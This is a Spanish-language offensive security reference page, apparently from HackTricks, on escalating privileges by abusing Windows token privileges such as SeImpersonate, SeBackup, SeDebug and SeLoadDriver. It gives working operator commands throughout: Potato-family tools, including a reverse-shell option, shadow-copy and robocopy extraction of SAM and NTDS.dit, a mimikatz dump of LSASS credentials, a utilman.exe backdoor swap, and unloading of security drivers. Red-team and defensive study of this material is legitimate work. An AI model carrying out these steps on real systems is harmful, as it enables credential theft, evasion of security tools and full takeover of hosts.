# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Si **no sabes qué son Windows Access Tokens** lee esta página antes de continuar:


{{#ref}}
access-tokens.md
{{#endref}}

**Quizá puedas escalar privilegios abusando de los tokens que ya tienes**

### SeImpersonatePrivilege

Este es un privilege que posee cualquier process y permite la impersonation (pero no la creación) de cualquier token, siempre que se pueda obtener un handle a él. Se puede adquirir un privileged token desde un Windows service (DCOM) induciéndolo a realizar autenticación NTLM contra un exploit, habilitando posteriormente la ejecución de un process con privilegios SYSTEM. Esta vulnerability puede explotarse usando varias tools, como [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (que requiere que winrm esté deshabilitado), [SweetPotato](https://github.com/CCob/SweetPotato) y [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: on Windows 10 1809+/Server 2019+, prefer **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, or **PrintSpoofer** depending on which RPC/COM surface is still reachable.
- If you compromised a service running as **`LOCAL SERVICE`** or **`NETWORK SERVICE`** and `whoami /priv` shows a **filtered token** without `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recover the account's **default privilege set** first (for example with **FullPowers**) and retry the potato family afterwards.
- Some newer forks are more operator-friendly than the original tools. For example, **SigmaPotato** adds reflection/in-memory execution and modern Windows compatibility, while **PrintNotifyPotato** abuses the PrintNotify COM service and is often useful when the classic Spooler path is disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Es muy similar a **SeImpersonatePrivilege**, usará el **mismo método** para obtener un token privilegiado.\
Luego, este privilegio permite **asignar un primary token** a un proceso nuevo/suspendido. Con el token de impersonation privilegiado puedes derivar un primary token (DuplicateTokenEx).\
Con el token, puedes crear un **nuevo proceso** con 'CreateProcessAsUser' o crear un proceso suspendido y **establecer el token** (en general, no puedes modificar el primary token de un proceso en ejecución).

### SeTcbPrivilege

Si tienes habilitado este token puedes usar **KERB_S4U_LOGON** para obtener un **impersonation token** para cualquier otro usuario sin conocer las credenciales, **añadir un grupo arbitrario** (admins) al token, establecer el **integrity level** del token en "**medium**", y asignar este token al **current thread** (SetThreadToken).

### SeBackupPrivilege

El sistema hace que se **conceda todo el acceso de lectura** a cualquier archivo (limitado a operaciones de lectura) mediante este privilegio. Se utiliza para **leer los password hashes del local Administrator** desde el registro, tras lo cual se pueden usar herramientas como "**psexec**" o "**wmiexec**" con el hash (técnica Pass-the-Hash). Sin embargo, esta técnica falla bajo dos condiciones: cuando la cuenta Local Administrator está deshabilitada, o cuando hay una policy que elimina los derechos administrativos de los Local Administrators que se conectan remotamente.\
En la práctica, el flujo de trabajo integrado más fiable suele ser **VSS + `robocopy /b`**: crear/exponer una shadow copy, y luego copiar `SAM`/`SYSTEM` o `NTDS.dit` en **backup mode**, lo que omite los file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Puedes **abusar de este privilegio** con:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- siguiendo a **IppSec** en [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- O como se explica en la sección **escalating privileges with Backup Operators** de:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Este privilegio proporciona permiso de **write access** a cualquier archivo del sistema, independientemente de la Access Control List (ACL) del archivo. Abre numerosas posibilidades de escalada, incluida la capacidad de **modify services**, realizar DLL Hijacking y configurar **debuggers** mediante Image File Execution Options, entre otras técnicas.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege es un permiso poderoso, especialmente útil cuando un usuario tiene la capacidad de impersonate tokens, pero también en ausencia de SeImpersonatePrivilege. Esta capacidad depende de la posibilidad de impersonar un token que represente al mismo usuario y cuyo integrity level no exceda el del proceso actual.

**Puntos clave:**

- **Impersonation sin SeImpersonatePrivilege:** Es posible aprovechar SeCreateTokenPrivilege para EoP impersonando tokens bajo condiciones específicas.
- **Condiciones para Token Impersonation:** La impersonation exitosa requiere que el target token pertenezca al mismo usuario y tenga un integrity level menor o igual al integrity level del proceso que intenta la impersonation.
- **Creación y modificación de Impersonation Tokens:** Los usuarios pueden crear un impersonation token y mejorarlo añadiendo el SID (Security Identifier) de un grupo privilegiado.

### SeLoadDriverPrivilege

Este privilegio permite **load and unload device drivers** con la creación de una entrada de registry con valores específicos para `ImagePath` y `Type`. Como el write access directo a `HKLM` (HKEY_LOCAL_MACHINE) está restringido, debe utilizarse `HKCU` (HKEY_CURRENT_USER) en su lugar. Sin embargo, para que `HKCU` sea reconocible por el kernel para la configuración del driver, debe seguirse una ruta específica.

El uso ofensivo moderno suele ser **BYOVD** (bring your own vulnerable driver): cargar un driver de kernel **signed but vulnerable** y luego usar sus IOCTLs para desactivar protecciones o saltar a ejecución de código en kernel. Ten en cuenta que en versiones recientes de Windows 11/Server, la **Microsoft vulnerable driver blocklist** y/o **HVCI/Memory Integrity** a menudo rompen cadenas públicas antiguas, por lo que los ejemplos clásicos al estilo `szkg64.sys` ya no son fiables universalmente.

Esta ruta es `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, donde `<RID>` es el Relative Identifier del usuario actual. Dentro de `HKCU`, debe crearse toda esta ruta, y hay que establecer dos valores:

- `ImagePath`, que es la ruta al binario que se ejecutará
- `Type`, con un valor de `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Pasos a seguir:**

1. Acceder a `HKCU` en lugar de `HKLM` debido al write access restringido.
2. Crear la ruta `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` dentro de `HKCU`, donde `<RID>` representa el Relative Identifier del usuario actual.
3. Establecer `ImagePath` en la ruta de ejecución del binario.
4. Asignar `Type` como `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Más formas de abusar de este privilegio en [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Esto es similar a **SeRestorePrivilege**. Su función principal permite a un proceso **asumir la propiedad de un objeto**, eludiendo el requisito de acceso discrecional explícito mediante la concesión de derechos de acceso WRITE_OWNER. El proceso consiste primero en obtener la propiedad de la clave de registro objetivo para fines de escritura, y luego alterar la DACL para habilitar operaciones de escritura.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Este privilegio permite **depurar otros procesos**, incluyendo leer y escribir en la memoria. Con este privilegio se pueden emplear varias estrategias de memory injection, capaces de evadir la mayoría de soluciones antivirus y host intrusion prevention.

En Windows moderno, recuerda que `SeDebugPrivilege` suele ser suficiente para abrir **procesos SYSTEM no protegidos** y duplicar sus tokens, pero **no** garantiza que puedas tocar **LSASS**. Si **RunAsPPL / LSA Protection** está habilitado, los procesos no protegidos no pueden leer ni inyectar en LSASS aunque `SeDebugPrivilege` esté presente. En ese caso, roba un token de otro proceso SYSTEM no-PPL, o encadena con un bypass de PPL/BYOVD en lugar de asumir que `procdump` funcionará. Para un ejemplo completo de copia de token usando `SeDebugPrivilege` + `SeImpersonatePrivilege`, consulta [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Podrías usar [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) de la [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) para **capturar la memoria de un proceso**. En concreto, esto puede aplicarse al proceso **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, que es responsable de almacenar las credenciales del usuario una vez que este ha iniciado sesión correctamente en un sistema.

Luego puedes cargar este dump en mimikatz para obtener passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Si quieres obtener una shell `NT SYSTEM` podrías usar:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Este derecho (Perform volume maintenance tasks) permite abrir manejadores de dispositivo de volumen sin procesar (p. ej., \\.\C:) para I/O directo de disco que omite las ACL de NTFS. Con esto puedes copiar bytes de cualquier archivo del volumen leyendo los bloques subyacentes, lo que permite la lectura arbitraria de archivos de material sensible (p. ej., claves privadas de la máquina en %ProgramData%\Microsoft\Crypto\, hives del registro, SAM/NTDS mediante VSS). Es especialmente impactante en servidores CA, donde extraer la clave privada de la CA permite forjar un Golden Certificate para suplantar a cualquier principal.

See detailed techniques and mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges
```
whoami /priv
```
Los **tokens que aparecen como Disabled** generalmente pueden habilitarse, así que a menudo puedes abusar tanto de privilegios _Enabled_ como _Disabled_.

### Habilitar todos los tokens

Si tienes privilegios deshabilitados, puedes usar el script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) para habilitar todos los tokens:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
O el **script** incrustado en este [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Lista completa de privilegios de token en [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), el resumen de abajo solo enumerará formas directas de explotar el privilegio para obtener una sesión de admin o leer archivos sensibles.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Gracias [Aurélien Chalot](https://twitter.com/Defte_) por la actualización. Intentaré reformularlo pronto con un estilo más tipo receta.                                                                                                                                                                                       |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Leer archivos sensibles con `robocopy /b` o helpers dedicados compatibles con SeBackup.                                                                                                                                                                                                                                                                 | <p>- Genial para `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, y a veces `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` es cómodo, pero los cmdlets/APIs dedicados a SeBackup suelen ser más flexibles para archivos bloqueados/abiertos.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Crear un token arbitrario, incluidos derechos de admin local, con `NtCreateToken`.                                                                                                                                                                                                                                                                  |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicar un token SYSTEM **no-PPL** o volcar memoria desde un proceso no protegido.                                                                                                                                                                                                                                                                 | <p>El volcado de LSASS suele bloquearse si RunAsPPL/LSA Protection está habilitado.</p><p>Script que se encuentra en [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Usar la familia **Potato** / suplantación por named-pipe para lanzar SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Lo más práctico es hacerlo desde service accounts como IIS APPPOOL, MSSQL, tareas programadas, o cualquier contexto que ya tenga `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Cargar un driver de kernel firmado pero vulnerable (BYOVD)<br>2. Usar los IOCTLs del driver para obtener lectura/escritura en kernel, desactivar herramientas de seguridad o elevar a SYSTEM<br><br>Alternativamente, el privilegio puede usarse para descargar drivers relacionados con seguridad con el comando builtin <code>fltMC</code>, es decir <code>fltMC sysmondrv</code></p>                     | <p>Drivers públicos antiguos como <code>szkg64.sys</code> están cada vez más bloqueados en Windows moderno por la vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Iniciar PowerShell/ISE con el privilegio SeRestore presente.<br>2. Habilitar el privilegio con <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Renombrar utilman.exe a utilman.old<br>4. Renombrar cmd.exe a utilman.exe<br>5. Bloquear la consola y pulsar Win+U</p> | <p>El ataque puede ser detectado por algún software AV.</p><p>Un método alternativo se basa en reemplazar binarios de servicios almacenados en "Program Files" usando el mismo privilegio</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Renombrar cmd.exe a utilman.exe<br>4. Bloquear la consola y pulsar Win+U</p>                                                                                                                                       | <p>El ataque puede ser detectado por algún software AV.</p><p>Un método alternativo se basa en reemplazar binarios de servicios almacenados en "Program Files" usando el mismo privilegio.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipular tokens para que incluyan derechos de admin local. Puede requerir SeImpersonate.</p><p>Pendiente de verificar.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Mira esta tabla que define Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Mira [**este paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) sobre privesc con tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
